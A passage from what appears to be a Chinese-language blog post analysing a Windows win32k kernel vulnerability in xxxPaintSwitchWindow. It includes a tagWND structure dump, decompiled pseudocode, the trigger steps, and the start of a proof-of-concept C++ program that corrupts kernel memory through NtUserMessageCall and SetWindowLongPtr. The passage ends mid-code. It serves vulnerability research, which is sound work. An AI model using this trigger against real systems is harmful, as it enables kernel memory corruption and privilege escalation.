class="line">/*0x02C*/             INT32        bMaximizeMonitorRegion : 1;       // 11 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bCloseButtonDown : 1;             // 12 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bMaximizeButtonDown : 1;          // 13 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bMinimizeButtonDown : 1;          // 14 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bHelpButtonDown : 1;              // 15 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bScrollBarLineUpBtnDown : 1;      // 16 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bScrollBarPageUpBtnDown : 1;      // 17 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bScrollBarPageDownBtnDown : 1;    // 18 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bScrollBarLineDownBtnDown : 1;    // 19 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bAnyScrollButtonDown : 1;         // 20 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bScrollBarVerticalTracking : 1;   // 21 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bForceNCPaint : 1;                // 22 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bForceFullNCPaintClipRgn : 1;     // 23 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        FullScreenMode : 3;               // 24 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bCaptionTextTruncated : 1;        // 27 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bNoMinmaxAnimatedRects : 1;       // 28 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bSmallIconFromWMQueryDrag : 1;    // 29 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bShellHookRegistered : 1;         // 30 BitPosition                     </span><br><span class="line">/*0x02C*/             INT32        bWMCreateMsgProcessed : 1;        // 31 BitPosition                     </span><br><span class="line">                  &#125;;                                                                                       </span><br><span class="line">              &#125;;                                                                                           </span><br><span class="line">              union                                                  // 2 elements, 0x4 bytes (sizeof)     </span><br><span class="line">              &#123;                                                                                            </span><br><span class="line">/*0x030*/         ULONG32      ExStyle;                                                                    </span><br><span class="line">                  struct                                             // 32 elements, 0x4 bytes (sizeof)    </span><br><span class="line">                  &#123;                                                                                        </span><br><span class="line">/*0x030*/             INT32        bWS_EX_DLGMODALFRAME : 1;         // 0 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bUnused1 : 1;                     // 1 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bWS_EX_NOPARENTNOTIFY : 1;        // 2 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bWS_EX_TOPMOST : 1;               // 3 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bWS_EX_ACCEPTFILE : 1;            // 4 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bWS_EX_TRANSPARENT : 1;           // 5 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bWS_EX_MDICHILD : 1;              // 6 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bWS_EX_TOOLWINDOW : 1;            // 7 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bWS_EX_WINDOWEDGE : 1;            // 8 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bWS_EX_CLIENTEDGE : 1;            // 9 BitPosition                      </span><br><span class="line">/*0x030*/             INT32        bWS_EX_CONTEXTHELP : 1;           // 10 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bMakeVisibleWhenUnghosted : 1;    // 11 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_RIGHT : 1;                 // 12 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_RTLREADING : 1;            // 13 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_LEFTSCROLLBAR : 1;         // 14 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bUnused2 : 1;                     // 15 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_CONTROLPARENT : 1;         // 16 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_STATICEDGE : 1;            // 17 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_APPWINDOW : 1;             // 18 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_LAYERED : 1;               // 19 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_NOINHERITLAYOUT : 1;       // 20 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bUnused3 : 1;                     // 21 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_LAYOUTRTL : 1;             // 22 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_NOPADDEDBORDER : 1;        // 23 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bUnused4 : 1;                     // 24 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_COMPOSITED : 1;            // 25 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bUIStateActive : 1;               // 26 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_NOACTIVATE : 1;            // 27 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bWS_EX_COMPOSITEDCompositing : 1; // 28 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bRedirected : 1;                  // 29 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bUIStateKbdAccelHidden : 1;       // 30 BitPosition                     </span><br><span class="line">/*0x030*/             INT32        bUIStateFocusRectHidden : 1;      // 31 BitPosition                     </span><br><span class="line">                  &#125;;                                                                                       </span><br><span class="line">              &#125;;                                                                                           </span><br><span class="line">              union                                                  // 2 elements, 0x4 bytes (sizeof)     </span><br><span class="line">              &#123;                                                                                            </span><br><span class="line">/*0x034*/         ULONG32      style;                                                                      </span><br><span class="line">                  struct                                             // 31 elements, 0x4 bytes (sizeof)    </span><br><span class="line">                  &#123;                                                                                        </span><br><span class="line">/*0x034*/             INT32        bReserved1 : 16;                  // 0 BitPosition                      </span><br><span class="line">/*0x034*/             INT32        bWS_MAXIMIZEBOX : 1;              // 16 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bReserved2 : 16;                  // 0 BitPosition                      </span><br><span class="line">/*0x034*/             INT32        bWS_TABSTOP : 1;                  // 16 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bReserved3 : 16;                  // 0 BitPosition                      </span><br><span class="line">/*0x034*/             INT32        bUnused5 : 1;                     // 16 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_MINIMIZEBOX : 1;              // 17 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bReserved4 : 16;                  // 0 BitPosition                      </span><br><span class="line">/*0x034*/             INT32        bUnused6 : 1;                     // 16 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_GROUP : 1;                    // 17 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bReserved5 : 16;                  // 0 BitPosition                      </span><br><span class="line">/*0x034*/             INT32        bUnused7 : 2;                     // 16 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_THICKFRAME : 1;               // 18 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bReserved6 : 16;                  // 0 BitPosition                      </span><br><span class="line">/*0x034*/             INT32        bUnused8 : 2;                     // 16 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_SIZEBOX : 1;                  // 18 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bReserved7 : 16;                  // 0 BitPosition                      </span><br><span class="line">/*0x034*/             INT32        bUnused9 : 3;                     // 16 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_SYSMENU : 1;                  // 19 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_HSCROLL : 1;                  // 20 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_VSCROLL : 1;                  // 21 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_DLGFRAME : 1;                 // 22 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_BORDER : 1;                   // 23 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bMaximized : 1;                   // 24 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_CLIPCHILDREN : 1;             // 25 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_CLIPSIBLINGS : 1;             // 26 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bDisabled : 1;                    // 27 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bVisible : 1;                     // 28 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bMinimized : 1;                   // 29 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_CHILD : 1;                    // 30 BitPosition                     </span><br><span class="line">/*0x034*/             INT32        bWS_POPUP : 1;                    // 31 BitPosition                     </span><br><span class="line">                  &#125;;                                                                                       </span><br><span class="line">              &#125;;                                                                                           </span><br><span class="line">/*0x038*/     VOID*        hModule;                                                                        </span><br><span class="line">/*0x040*/     UINT16       hMod16;                                                                         </span><br><span class="line">/*0x042*/     UINT16       fnid;                                                                           </span><br><span class="line">/*0x044*/     UINT8        _PADDING0_[0x4];                                                                </span><br><span class="line">/*0x048*/     struct _tagWND* spwndNext;                                                                   </span><br><span class="line">/*0x050*/     struct _tagWND* spwndPrev;                                                                   </span><br><span class="line">/*0x058*/     struct _tagWND* spwndParent;                                                                 </span><br><span class="line">/*0x060*/     struct _tagWND* spwndChild;                                                                  </span><br><span class="line">/*0x068*/     struct _tagWND* spwndOwner;                                                                  </span><br><span class="line">/*0x070*/     struct _tagRECT rcWindow;                              // 4 elements, 0x10 bytes (sizeof)    </span><br><span class="line">/*0x080*/     struct _tagRECT rcClient;                              // 4 elements, 0x10 bytes (sizeof)    </span><br><span class="line">/*0x090*/     FUNCT_0075_0FB0_lpfnWndProc_aStoCidPfn* lpfnWndProc;                                         </span><br><span class="line">/*0x098*/     struct _tagCLS* pcls;                                                                        </span><br><span class="line">/*0x0A0*/     struct _HRGN__* hrgnUpdate;                                                                  </span><br><span class="line">/*0x0A8*/     struct _tagPROPLIST* ppropList;                                                              </span><br><span class="line">/*0x0B0*/     struct _tagSBINFO* pSBInfo;                                                                  </span><br><span class="line">/*0x0B8*/     struct _tagMENU* spmenuSys;                                                                  </span><br><span class="line">/*0x0C0*/     struct _tagMENU* spmenu;                                                                     </span><br><span class="line">/*0x0C8*/     struct _HRGN__* hrgnClip;                                                                    </span><br><span class="line">/*0x0D0*/     struct _HRGN__* hrgnNewFrame;                                                                </span><br><span class="line">/*0x0D8*/     struct _LARGE_UNICODE_STRING strName;                  // 4 elements, 0x10 bytes (sizeof)    </span><br><span class="line">/*0x0E8*/     INT32        cbwndExtra;                                                                     </span><br><span class="line">/*0x0EC*/     UINT8        _PADDING1_[0x4];                                                                </span><br><span class="line">/*0x0F0*/     struct _tagWND* spwndLastActive;                                                             </span><br><span class="line">/*0x0F8*/     struct _HIMC__* hImc;                                                                        </span><br><span class="line">/*0x100*/     UINT64       dwUserData;                                                                     </span><br><span class="line">/*0x108*/     struct _ACTIVATION_CONTEXT* pActCtx;                                                         </span><br><span class="line">/*0x110*/     struct _D3DMATRIX* pTransform;                                                               </span><br><span class="line">/*0x118*/     struct _tagWND* spwndClipboardListenerNext;                                                  </span><br><span class="line">              union                                                  // 2 elements, 0x4 bytes (sizeof)     </span><br><span class="line">              &#123;                                                                                            </span><br><span class="line">/*0x120*/         ULONG32      ExStyle2;                                                                   </span><br><span class="line">                  struct                                             // 12 elements, 0x4 bytes (sizeof)    </span><br><span class="line">                  &#123;                                                                                        </span><br><span class="line">/*0x120*/             INT32        bClipboardListener : 1;           // 0 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bLayeredInvalidate : 1;           // 1 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bRedirectedForPrint : 1;          // 2 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bLinked : 1;                      // 3 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bLayeredForDWM : 1;               // 4 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bLayeredLimbo : 1;                // 5 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bHIGHDPI_UNAWARE_Unused : 1;      // 6 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bVerticallyMaximizedLeft : 1;     // 7 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bVerticallyMaximizedRight : 1;    // 8 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bHasOverlay : 1;                  // 9 BitPosition                      </span><br><span class="line">/*0x120*/             INT32        bConsoleWindow : 1;               // 10 BitPosition                     </span><br><span class="line">/*0x120*/             INT32        bChildNoActivate : 1;             // 11 BitPosition                     </span><br><span class="line">                  &#125;;                                                                                       </span><br><span class="line">              &#125;;                                                                                           </span><br><span class="line">          &#125;tagWND, *PtagWND;  </span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220801185405188.png" alt="image-20220801185405188"></p>
<p>验证保存的地址是否为0，以及保存的地址偏移0x6C的内容是否为0：</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220801190312808.png" alt="image-20220801190312808"></p>
<p>对rdi保存的地址偏移0x5C到0x6C这段区域进行增减操作，增减的数值由<code>GetDPIMetrics</code>函数的返回值决定，这些操作是会扩大这些与rdi偏移的地址中保存的内容</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220801191229317.png" alt="image-20220801191229317"></p>
<p>总结，函数取出扩展区域最开始八字节保存的地址，仅验证这个地址是否为0，对于它是否合法没有验证。而扩展区域中的内容又可以在用户层通过<code>SetWindowLong</code>函数修改，如果把这个地址指向窗口对象的<code>cbwndExtra</code>成员地址偏移-0x60处，最后面的增减操作就会扩大<code>cbwndExtra</code>。</p>
<p>一步步交叉引用可以看到调用链为<code>xxxWrapSwitchWndProc-&gt;xxxSwitchWndProc-&gt;xxxPaintSwitchWindow</code>，第一个函数在<code>InitFunctionTables</code>表中，要想调用<code>xxxWrapSwitchWndProc</code>函数，我们需要调用<code>NtUserMessageCall</code>,下面是它的函数申明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtUserMessageCall(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType)</span><br></pre></td></tr></table></figure>

<p>首先该函数在<code>msg &lt; 0x400</code>的时候，就会调用<code>gapfnMessageCall</code>数组中保存的函数地址：</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220801194743717.png" alt="image-20220801194743717"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220801195018377.png" alt="image-20220801195018377"></p>
<p><code>gapfnMessageCall</code>数组保存了一系列的函数，其中就有<code>NtUserfnINLPDRAWITEMSTRUCT</code>:</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220801195122821.png" alt="image-20220801195122821"></p>
<p><code>NtUserfnINLPDRAWITEMSTRUCT</code>函数通过参数<code>dwType</code>计算偏移，调用<code>gpsi</code>偏移中保存的函数：</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220801195347598.png" alt="image-20220801195347598"></p>
<p><code>gpsi</code>偏移地址保存的函数在<code>InitFunctionTables</code>函数中初始化，其中偏移0x40处保存了<code>xxxWrapSwitchWndProc</code>，所以参数<code>dwType</code>需要为0，这样(8 * 6) &amp; 0x1F+ 0x10 = 0x30 + 0x10 = 0x40，<code>NtUserfnINLPDRAWITEMSTRUCT</code>就会调用<code>xxxWrapSwitchWndProc</code>。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220801201534046.png" alt="image-20220801201534046"></p>
<p>根据前面的分析<code>xxxWrapSwitchWndProc</code>会调用<code>xxxSwitchWndProc</code>函数，函数分为下面两个部分，首先第一个部分是判断<code>tagWND-&gt;fnid</code>值，对于新创建的窗口，该值为0。</p>
<p>在第一个<code>if</code>语句中，<code>tagWND+0xE8</code>是<code>tagWND-&gt;cbwndExtra</code>，因为<code>tagWND-&gt;fnid</code>已经是0了，并且因为要用到扩展区域最开始八字节保存的内容，所以这里<code>cbwndExtra</code>至少为8。<code>*(gpsi+0x154)</code>值在未修复版本的win32k中为0，在修复版本中即使它被设置为0x130。那么，这里就是在判断<code>gpsi+0x154</code>保存的内容大于等于至少0x130，所以这个条件不会成立。</p>
<p>第二个<code>if</code>中，在传递的参数msg为WM_CREATE的时候，函数就不会返回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define WM_CREATE                       0x0001</span><br></pre></td></tr></table></figure>

<p>第三个<code>if</code>中，（<code>tagWND+0x128</code>会紧接在<code>tagWND</code>结构之后，也就是后面我们要控制的<code>ExtraBytes</code>）只要通过<code>SetWindowLong</code>设置扩展区域起始的八字节不为0就不会返回。</p>
<p>如果这三处都不成立，就会将<code>tagWND-&gt;fnid</code>设置为<code>0x2A0</code>。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220801203438234.png" alt="image-20220801203438234"></p>
<p>第二部分就是<code>switch</code>部分，msg为<code>0x3A</code>或者<code>0x14</code>的时候，<code>xxxSwitchWndProc</code>就会调用<code>xxxPaintSwitchWindow</code>。</p>
<p>注意函数逻辑，我们需要<strong>两次进入这个函数</strong>才能出发漏洞，第一次进入msg为1，最后将<code>tagWND-&gt;fnid</code>设置为<code>0x2A0</code>，第二次调用的时候就可以将msg指定为<code>0x3A</code>或者<code>0x14</code>，进而调用漏洞函数<code>xxxPaintSwitchWindow</code>,下面是这个函数的伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">xxxPaintSwitchWindow</span><span class="params">(tagWND *pwndSwitch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( (pwndSwitch-&gt;style &amp; <span class="number">0x10000000</span>) != <span class="number">0</span>  )<span class="comment">//bVisible被置位</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (pwndSwitch-&gt;fnid &amp; <span class="number">0x3FFF</span>) == <span class="number">0x2A0</span></span><br><span class="line"><span class="comment">/*7*/</span>  &amp;&amp; pwndSwitch-&gt;cbwndExtra + <span class="number">0x128</span>i64 == *(<span class="keyword">unsigned</span> __int16 *)(gpsi + <span class="number">0x154</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((<span class="keyword">char</span> *)&amp;pwndSwitch-&gt;<span class="number">1</span> + <span class="number">3</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      ExtraBytes = (_QWORD *)pwndSwitch-&gt;ExtraBytes;<span class="comment">//控制这个值</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">if</span> ( ExtraBytes )</span><br><span class="line">   &#123;</span><br><span class="line">      hdcSwitch = (HDC)GetDCEx(pwndSwitch, <span class="number">0</span>i64, <span class="number">0x10000</span>i64);</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)ExtraBytes + <span class="number">0x1B</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line"><span class="comment">/*18*/</span>LOBYTE(v3) = <span class="number">0x12</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (GetKeyState(v3) &amp; <span class="number">0x8000</span>u) == <span class="number">0</span>i64 )<span class="comment">//判断Alt键状态</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)ExtraBytes + <span class="number">0x1B</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( GetAsyncKeyState(<span class="number">0x12</span>u) &gt;= <span class="number">0</span> )<span class="comment">//判断Alt键状态</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      &#125;</span><br><span class="line">      GetClientRect(pwndSwitch, (<span class="keyword">char</span> *)ExtraBytes + <span class="number">92</span>);</span><br><span class="line">      FillRect(hdcSwitch, (<span class="keyword">char</span> *)ExtraBytes + <span class="number">0x5C</span>, *(_QWORD *)(gpsi + <span class="number">3024</span>));</span><br><span class="line">      v5 = -*((_DWORD *)GetDPIMetrics() + <span class="number">0x13</span>);</span><br><span class="line">      v6 = *((_DWORD *)GetDPIMetrics() + <span class="number">0x12</span>);</span><br><span class="line">      *((_DWORD *)ExtraBytes + <span class="number">0x18</span>) -= v5;</span><br><span class="line">      *((_DWORD *)ExtraBytes + <span class="number">0x1A</span>) += v5;</span><br><span class="line">      v6 *= <span class="number">-2</span>;</span><br><span class="line">      *((_DWORD *)ExtraBytes + <span class="number">0x17</span>) -= v6;</span><br><span class="line">      *((_DWORD *)ExtraBytes + <span class="number">0x19</span>) += v6;</span><br><span class="line">     ...</span><br><span class="line">   &#125;</span><br><span class="line">   ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为IDA上都是偏移不是很明确，所以这里借鉴了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41252520/article/details/120308729">这位博主的博客</a>，其中<code>pwndSwitch</code>表示的是被切换窗口的内核对象，满足4个条件：</p>
<ul>
<li>被切换的窗口可视 @line:4</li>
<li>被切换窗口的<code>fnid&amp;0x3FFF==0x2A0</code></li>
<li>被切换的窗口的额外数据大小加上<code>0x128</code>的值与<code>gpsi+0x154</code>指向的内存值相等 @line:7</li>
<li>Alt键按下</li>
</ul>
<p>关于第三点，创建窗口的时候，<code>cbwndExtra</code>只需要设置为8就可以完成触发和利用。所以这里就是在判断<code>[gpsi + 0x154]</code>是否等于<code>0x130</code>。而创建类名为<code>&quot;#32771&quot;(0x8003)</code>窗口的时候，会将<code>[gpsi + 0x154]</code>设置为<code>0x130</code>，所以只需要通过创建这样一个窗口就可以绕过。<strong>最后五行就是漏洞关键点</strong>，获取的<code>ExtraBytes</code>的值会被当成一个指针去修改一块内存的值，我们可以控制这个变量的值，进而实现任意内存破坏。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>所以漏洞触发步骤如下：</p>
<blockquote>
<p>创建一个可见的带有八字节扩展区域的窗口用来触发漏洞。</p>
<p> 调用<code>NtUserMessageCall</code>，参数msg为<code>WM_CREATE(0x1)</code>，将<code>tagWND-&gt;fnid</code>设置为<code>0x2A0</code>。</p>
<p>将扩展区域最开始八字节保存的地址设置为一个不合法的地址。</p>
<p> 创建类名为”32771”的窗口，将<code>[gpsi + 0x154]</code>设置为<code>0x130</code>。</p>
<p>调用<code>NtUserMessageCall</code>函数，参数msg为<code>WM_ERASEBKGND(0x14)</code>，这样就会指向漏洞函数。</p>
</blockquote>
<h3 id="漏洞验证POC"><a href="#漏洞验证POC" class="headerlink" title="漏洞验证POC"></a>漏洞验证POC</h3><p>我们需要获得<code>NtUserMessageCall</code>函数的系统调用号，windbg调试的时候先<code>.reload</code>，详细可以看这篇<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/258926.html">博客</a>。</p>
<p>源文件一共两个，一个cpp一个asm.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">NtUserMessageCall</span><span class="params">(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL bAscii)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;text:&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    HINSTANCE hInstance = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WNDCLASSEX wcx;</span><br><span class="line">    ZeroMemory(&amp;wcx, <span class="keyword">sizeof</span>(wcx));</span><br><span class="line">    wcx.hInstance = hInstance;</span><br><span class="line">    wcx.cbSize = <span class="keyword">sizeof</span>(wcx);</span><br><span class="line">    wcx.lpszClassName = <span class="string">L&quot;SploitWnd&quot;</span>;</span><br><span class="line">    wcx.lpfnWndProc = DefWindowProc;</span><br><span class="line">    wcx.cbWndExtra = <span class="number">8</span>; <span class="comment">//to pass check in xxxSwitchWndProc</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Registering window\n&quot;</span>);</span><br><span class="line">    ATOM wndAtom = RegisterClassEx(&amp;wcx);</span><br><span class="line">    <span class="keyword">if</span> (wndAtom == INVALID_ATOM) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed registering SploitWnd window class\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Creating instance of this window\n&quot;</span>);</span><br><span class="line">    HWND sploitWnd = CreateWindowEx(<span class="number">0</span>, <span class="string">L&quot;SploitWnd&quot;</span>, <span class="string">L&quot;&quot;</span>, WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (sploitWnd == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to create SploitWnd window\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Calling NtUserMessageCall to set fnid = 0x2A0 on window\n&quot;</span>);</span><br><span class="line">    NtUserMessageCall(sploitWnd, WM_CREATE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Calling SetWindowLongPtr to set window extra data, that will be later dereferenced\n&quot;</span>);</span><br><span class="line">    SetWindowLongPtr(sploitWnd, <span class="number">0</span>, <span class="number">0x4141414141414</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] GetLastError = %x\n&quot;</span>, GetLastError());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Creating switch window #32771, this has a result of setting (gpsi+0x154) = 0x130\n&quot;</span>);</span><br><span class="line">    HWND switchWnd = CreateWindowEx(<span class="number">0</span>, (LPCWSTR)<span class="number">0x8003</span>, <span 